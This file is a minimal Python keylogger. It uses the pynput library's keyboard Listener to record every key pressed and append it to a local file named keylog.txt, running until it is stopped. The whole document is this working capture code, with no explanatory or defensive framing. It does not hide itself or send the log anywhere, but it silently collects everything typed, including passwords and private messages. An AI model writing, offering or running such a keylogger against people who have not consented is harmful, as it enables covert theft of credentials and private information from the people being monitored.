from pynput.keyboard import Key, Listener


def on_press(key):
    try:
        with open('keylog.txt', 'a') as f:
            f.write('{0}\n'.format(key))
    except AttributeError:
        pass

with Listener(on_press=on_press) as listener:
    listener.join()
